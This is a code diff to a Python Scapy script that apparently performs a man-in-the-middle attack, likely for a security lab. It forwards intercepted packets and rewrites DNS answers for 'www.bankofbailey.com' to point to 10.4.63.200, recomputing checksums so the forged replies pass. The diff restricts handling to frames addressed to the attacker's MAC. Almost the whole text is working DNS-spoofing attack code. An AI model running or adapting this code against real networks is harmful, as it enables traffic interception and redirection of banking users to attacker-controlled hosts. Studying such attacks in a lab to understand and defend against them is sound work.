@@ -55,24 +55,26 @@ routingMap = {}
 def handlePacket(pkt):
     global clientIP, serverIP, attackerMAC
     # Forward packet to indended host
+    shouldHandle = pkt[Ether].dst == attackerMAC
     ip_src = pkt[IP].src
     ip_dst = pkt[IP].dst
     pkt[Ether].src = attackerMAC
     pkt[Ether].dst = routingMap[ip_dst]
     # print(f" Modified packet MAC : {pkt[Ether].dst}")
     # Check if DNS packet
-    if pkt.haslayer(DNS):
-        dns = pkt.getlayer(DNS)
-        if dns.qr == 1:
-            if dns.an is not None and dns.an.rrname == b'www.bankofbailey.com.':
-                # Change response address
-                pkt[DNS].an.rdata = "10.4.63.200"
-                del pkt[IP].len
-                del pkt[IP].chksum
-                del pkt[UDP].len
-                del pkt[UDP].chksum
-                pkt = pkt.__class__(bytes(pkt))
-    sendp(pkt)
+    if shouldHandle:
+        if pkt.haslayer(DNS):
+            dns = pkt.getlayer(DNS)
+            if dns.qr == 1:
+                if dns.an is not None and dns.an.rrname == b'www.bankofbailey.com.':
+                    # Change response address
+                    pkt[DNS].an.rdata = "10.4.63.200"
+                    del pkt[IP].len
+                    del pkt[IP].chksum
+                    del pkt[UDP].len
+                    del pkt[UDP].chksum
+                    pkt = pkt.__class__(bytes(pkt))
+        sendp(pkt)
 
 
 # TODO: handle intercepted packets
